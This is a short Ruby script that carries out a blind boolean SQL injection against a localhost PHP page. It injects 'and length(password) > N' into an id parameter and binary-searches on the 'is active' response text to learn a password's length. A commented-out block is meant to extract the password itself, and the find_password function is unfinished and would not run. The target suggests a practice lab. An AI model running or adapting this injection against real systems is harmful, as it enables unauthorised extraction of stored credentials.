require 'open-uri'

END {    
    password_length = guess_value{ |value|
        URI.open("http://localhost/active.php?id=3 and length(password) > #{value}").read.include?  "is active"
    }
    puts "the length is: #{password_length}"
    
    # password = find_password(password_length){ |value|
    #     URI.open("http://localhost/active.php?id=3 and password = #{value}").read.include?  "is active"
    # }
    # puts "the password is: #{password}"
}

def guess_value
    max_value = 1
    max_value *= 2 while yield max_value
    min_value = max_value / 2
    puts "max: #{max_value} | min: #{min_value}"
    
    loop do
        value = (max_value - min_value) / 2 + min_value
        is_biggest = yield value
        if is_biggest
            min_value = value
        else
            max_value = value
        end 
        return max_value if (max_value - min_value) <= 1
    end
end

def find_password password_length
    until yield string

    end
end